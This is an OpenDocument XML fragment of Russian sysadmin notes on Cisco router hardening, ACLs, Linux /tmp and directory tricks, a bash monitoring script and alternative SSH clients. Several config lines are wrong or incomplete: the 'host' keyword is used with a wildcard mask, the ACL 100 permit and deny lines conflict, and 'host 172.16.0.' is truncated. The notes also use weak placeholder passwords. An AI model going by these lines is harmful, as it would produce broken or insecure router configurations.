      <text:p text:style-name="P2"><text:span text:style-name="T3">Включаем шифрование паролей - </text:span><text:span text:style-name="T2">service</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">password</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">encryption</text:span></text:p>
      <text:p text:style-name="P1">Используем новую модель ААА и локальную базу пользователей - </text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">aaa new-model</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">aaa authentication login default local</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Заводим пользователя с максимальными правами - </text:span><text:span text:style-name="T2">username</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">user</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">privilege</text:span><text:span text:style-name="T3"> 15 </text:span><text:span text:style-name="T2">secret</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">password</text:span></text:p>
      <text:p text:style-name="P1">Назначаем имя роутеру - </text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">hostname</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">R</text:span><text:span text:style-name="T3">1</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">domain</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">name</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">R</text:span><text:span text:style-name="T3">1.</text:span><text:span text:style-name="T2">domain</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Генерируем ключ для </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3"> - </text:span><text:span text:style-name="T2">crypto</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">key</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">generate</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">rsa</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Настраиваем SSH - </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip ssh authentication-retries 5</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip ssh version 2</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip ssh time-out 60</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Разрешаем </text:span><text:span text:style-name="T2">telnet</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">ssh</text:span><text:span text:style-name="T3"> на удаленной консоли и делаем доступ сразу в привилегированный режим 15го уровня </text:span><text:span text:style-name="T2">line</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">vty</text:span><text:span text:style-name="T3"> 0 4 - </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">transport input telnet ssh</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">privilege level 15</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Отключаем доступ по </text:span><text:span text:style-name="T2">http</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3"> - </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">no ip http server</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">no ip http secure-server</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Настройка временной зоны и </text:span><text:span text:style-name="T2">ntp</text:span><text:span text:style-name="T3"> - </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">clock timezone MSK 3</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ntp server 146.0.32.144</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Настраиваем DNS - </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip domain name domain</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip name-server 8.8.8.8</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Блокируем доступ при определённом количестве неправильных попыток - login block-for 600 attempts 5 within 30</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Отключаем ошибку резолва при неправильном наборе чего-либо в консоли - </text:span><text:span text:style-name="T2">no</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">domain</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">lookup</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Задаём </text:span><text:span text:style-name="T2">timeout</text:span><text:span text:style-name="T3"> неактивности </text:span><text:span text:style-name="T2">telnet</text:span><text:span text:style-name="T3"> сессии - </text:span><text:span text:style-name="T2">exec</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">timeout</text:span><text:span text:style-name="T3"> 15 0</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Cisco</text:span><text:span text:style-name="T3"> (защищаем доступ):</text:span></text:p>
      <text:p text:style-name="P1">Установим пароль на доступ через консольный порт -</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">line</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">console</text:span><text:span text:style-name="T3"> 0</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">login</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">password</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">password</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Создаём </text:span><text:span text:style-name="T2">access</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">list</text:span><text:span text:style-name="T3"> с разрешёнными для доступа сетями или хостами (пишем сети с обратной маской)</text:span></text:p>
      <text:p text:style-name="P15">access-list 1 permit 192.168.1.0 0.0.0.255 </text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">access-list 1 permit 192.168.2.0 0.0.0.255</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Отключаем доступ по виртуальному терминалу для протокола </text:span><text:span text:style-name="T2">telnet</text:span><text:span text:style-name="T3"> и применяем ранее созданный </text:span><text:span text:style-name="T2">access</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">list</text:span><text:span text:style-name="T3"> для ограничения доступа по </text:span><text:span text:style-name="T2">ssh</text:span><text:span text:style-name="T3"> -</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">line vty 0 4 </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">transport input ssh </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">access-class 1 in </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">privilege level 15 </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">login local </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Добавляем watch for login Attacks - </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">login block-for 600 attempts 2 within 30 </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">login delay 5 </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">login quiet-mode access-class 1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Cisco. ACL:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Стандартные ACL - </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">access-list 100 permit host 172.16.6.0 0.0.0.255</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">access-list 100 deny host 172.16.6.0 0.0.0.255</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Расширенные ACL - </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip access-list extended TEST</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>permit tcp host 172.16.6.66 host 172.16.0. eq ftp</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>permit tcp host 172.16.6.66 gt 1023 any eq www</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Правила проверяются сверху вниз. как только проверка доходит до правила под которое пакет подпадает, проверка прекращается, независимо от того какие правила идут дальше. в конце задаётся неявное правило</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">deny</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">any</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">any</text:span></text:p>
      <text:p text:style-name="P1">т.е. если явно что-то не разрешить сверху, то это будет запрещено</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Вешаем </text:span><text:span text:style-name="T2">ACL</text:span><text:span text:style-name="T3"> на интерфейс (</text:span><text:span text:style-name="T2">in</text:span><text:span text:style-name="T3"> или </text:span><text:span text:style-name="T2">out</text:span><text:span text:style-name="T3">) - </text:span></text:p>
      <text:p text:style-name="P2"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Иногда необходимо удалить конкретную запись в </text:span><text:span text:style-name="T2">access</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">list</text:span><text:span text:style-name="T3"> (для примера </text:span><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> 94.123.2.139). Для этого, сначала смотрим порядковые номера записей - </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">show</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">access</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">lists</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Standard</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">access</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">list</text:span><text:span text:style-name="T3"> 1</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s/></text:span><text:span text:style-name="T2">10 permit 185.40.30.134</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2"><text:s/>20 permit 94.141.60.123</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>30 permit 94.123.2.139</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>90 permit 88.196.234.16</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>50 permit 222.251.243.67</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>40 permit 143.35.7.238</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Затем удаляем нужную - </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># conf t</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">(config)# ip access-list s 1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">(config-ext-nacl)# no 30</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">В данном случае S - Standard Access List</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Если вдруг понадобилось вставить запись в конкретное место, делаем так:</text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"># conf t</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">(config)# ip access-list s 1</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">(config-ext-nacl)# 40 permit 94.123.2.139</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">OBJECT-GROUP</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Предположим, надо составить </text:span><text:span text:style-name="T2">ACL</text:span><text:span text:style-name="T3">, выпускающий три определенных адреса в интернет по трем одинаковым портам </text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3"> перспективой расширения количества адресов и портов. </text:span><text:span text:style-name="T2">Создаём список разрешённых портов - </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">object-group service INET-PORTS</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">description Ports allowed for some hosts</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcp eq www</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcp eq 8080</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tcp</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">eq</text:span><text:span text:style-name="T3"> 443</text:span></text:p>
      <text:p text:style-name="P1">Создаём список разрешённых ипишек - </text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">object-group network HOSTS-TO-INET</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">description Hosts allowed to browse the net</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">host 172.16.0.2</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">host 172.16.0.3</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">host 172.16.0.4</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Создаём ACL - </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip access-list extended INET-OUT</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">permit object-group INET-PORTS object-group HOSTS-TO-INET any</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">И в завершении вешаем </text:span><text:span text:style-name="T2">ACL</text:span><text:span text:style-name="T3"> на интерфейс - </text:span></text:p>
      <text:p text:style-name="P11"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Как скопировать структуру директорий в </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P1">Сначала необходимо перейти в директорию, где находятся нужная структура</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">1</text:span></text:p>
      <text:p text:style-name="P1">Затем выполняем команду, которая находит директории и сохраняет пути к ни в файл</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3"> . -</text:span><text:span text:style-name="T2">type</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3"> &gt; </text:span><text:span text:style-name="T2">dirs</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">txt</text:span></text:p>
      <text:p text:style-name="P1">Теперь необходимо перенести этот файл в директорию, где мы хотим воссоздать структуру</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">mv</text:span><text:span text:style-name="T3"> ./</text:span><text:span text:style-name="T2">dirs</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">txt</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">2</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Переходим туда</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">2</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">И используя </text:span><text:span text:style-name="T2">xargs</text:span><text:span text:style-name="T3"> читаем из файла пути и создаем по ним структуру директорий</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">xargs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">mkdir</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">p</text:span><text:span text:style-name="T3"> &lt; </text:span><text:span text:style-name="T2">dirs</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">txt</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Как увеличить размер каталога /</text:span><text:span text:style-name="T2">tmp</text:span><text:span text:style-name="T3">/:</text:span></text:p>
      <text:p text:style-name="P1">Иногда необходимо увеличить размер каталога, который в свою очередь находится в корневом каталоге системы.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Решить это можно перемонтированием каталога: </text:span><text:span text:style-name="T2">mount</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">tmpfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">tmpfs</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">tmp</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">o</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">size</text:span><text:span text:style-name="T3">=1024</text:span><text:span text:style-name="T2">M</text:span><text:span text:style-name="T3">,</text:span><text:span text:style-name="T2">mode</text:span><text:span text:style-name="T3">=1777,</text:span><text:span text:style-name="T2">remount</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Теперь проверим, есть ли у нас каталог в фстабе: </text:span><text:span text:style-name="T2">cat</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">fstab</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Если нет, создаем, если существует то выполняем следующую команду: </text:span><text:span text:style-name="T2">none</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">tmp</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">tmpfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">size</text:span><text:span text:style-name="T3">=1024</text:span><text:span text:style-name="T2">M</text:span><text:span text:style-name="T3">,</text:span><text:span text:style-name="T2">mode</text:span><text:span text:style-name="T3">=1777,</text:span><text:span text:style-name="T2">rw</text:span><text:span text:style-name="T3"> 0 0</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T3">Теперь готов каталог/</text:span><text:span text:style-name="T2">tmp</text:span><text:span text:style-name="T3">/ с размером, указанным в операторе “</text:span><text:span text:style-name="T2">size</text:span><text:span text:style-name="T3">” размером 1024 </text:span><text:span text:style-name="T2">mb</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T3">Скрипт </text:span><text:span text:style-name="T2">Bash </text:span><text:span text:style-name="T3">для проверки производительности системы в реальном времени, а также для сбора статистики использования за определенное время:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#!/bin/bash</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># This script monitors CPU and memory usage</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">while :</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">do </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/># Get the current usage of CPU and memory</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>cpuUsage=$(top -bn1 | awk '/Cpu/ { print $2}')</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>memUsage=$(free -m | awk '/Mem/{print $3}')</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/># Print the usage</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>echo "CPU Usage: $cpuUsage%"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>echo "Memory Usage: $memUsage MB"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/># Sleep for 1 second</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>sleep 1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3" loext:marker-style-name="T1"><text:span text:style-name="T2">done</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Подборка</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">из</text:span><text:span text:style-name="T2"> 4</text:span><text:span text:style-name="T3">х</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">альтернативых</text:span><text:span text:style-name="T2"> SSH </text:span><text:span text:style-name="T3">клиентов</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">1. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">mosh</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/ - свободное программное обеспечение, доступное для </text:span><text:span text:style-name="T2">GNU</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">BSD</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">macOS</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">Solaris</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">Android</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">Chrome</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">iOS</text:span><text:span text:style-name="T3">. </text:span><text:span text:style-name="T2">Mosh</text:span><text:span text:style-name="T3"> - это замена интерактивных терминалов </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3">. Он более надежен и отзывчив, особенно при работе через </text:span><text:span text:style-name="T2">Wi</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">Fi</text:span><text:span text:style-name="T3">, сотовую связь и на дальних расстояниях;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">2. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">goteleport</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/ - </text:span><text:span text:style-name="T2">Teleport</text:span><text:span text:style-name="T3"> с открытым исходным кодом был разработан для обеспечения доступа к необходимой инфраструктуре без замедления работы. С помощью одного инструмента инженеры получают унифицированный доступ к серверам </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">, кластерам </text:span><text:span text:style-name="T2">Kubernetes</text:span><text:span text:style-name="T3">, базам данных и приложениям </text:span><text:span text:style-name="T2">DevOps</text:span><text:span text:style-name="T3">, таким как </text:span><text:span text:style-name="T2">AWS</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Management</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Console</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">CI</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">CD</text:span><text:span text:style-name="T3">, контроль версий и панели мониторинга во всех средах;</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">3. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">eternalterminal</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/ - Удаленный терминал для занятых и нетерпеливых. </text:span><text:span text:style-name="T2">Eternal</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Terminal</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">ET</text:span><text:span text:style-name="T3">) - удаленная оболочка, которая автоматически переподключается, не прерывая сеанса;</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">4. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">github</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">tmux</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">tmux</text:span><text:span text:style-name="T3"> - терминальный мультиплексор: он позволяет создавать несколько терминалов, получать к ним доступ и управлять ими с одного экрана. </text:span><text:span text:style-name="T2">tmux</text:span><text:span text:style-name="T3"> может работать в фоновом режиме. Работает на </text:span><text:span text:style-name="T2">OpenBSD</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">FreeBSD</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">NetBSD</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">macOS</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">Solaris</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Примеры скриптов для </text:span><text:span text:style-name="T2">Mikrotik</text:span><text:span text:style-name="T3">:</text:span></text:p>
